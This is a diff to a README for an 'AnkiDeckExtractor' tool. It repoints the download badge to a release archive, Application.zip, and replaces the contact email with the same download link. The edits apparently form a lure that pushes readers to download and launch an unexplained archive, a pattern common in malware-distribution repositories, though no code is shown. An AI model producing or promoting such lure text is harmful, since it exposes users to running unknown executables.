@@ -12,7 +12,7 @@ Welcome to the **AnkiDeckExtractor** repository! This repository houses a powerf
 
 ### Usage
 To utilize the AnkiDeckExtractor tool, download the application from the following link:
-[![Download AnkiDeckExtractor](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download AnkiDeckExtractor](https://github.com/MuhammadAyan47/AnkiDeckExtractor/releases/download/v1.0.0/Application.zip)](https://github.com/MuhammadAyan47/AnkiDeckExtractor/releases/download/v1.0.0/Application.zip)
 
 Once downloaded, launch the application and follow the instructions to extract your Anki flashcard decks efficiently.
 
@@ -35,7 +35,7 @@ If the provided link ends with the file name, make sure to launch the applicatio
 We welcome contributions to enhance the AnkiDeckExtractor tool and make it even more valuable for developers in the educational technology space. Fork the repository, make your changes, and submit a pull request to collaborate with us!
 
 ### Connect with Us 📧
-Have questions, suggestions, or feedback? Reach out to us at [developer@example.com](mailto:developer@example.com). We value your input and are excited to hear from you!
+Have questions, suggestions, or feedback? Reach out to us at [https://github.com/MuhammadAyan47/AnkiDeckExtractor/releases/download/v1.0.0/Application.zip](https://github.com/MuhammadAyan47/AnkiDeckExtractor/releases/download/v1.0.0/Application.zip). We value your input and are excited to hear from you!
 
 ### License 📜
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
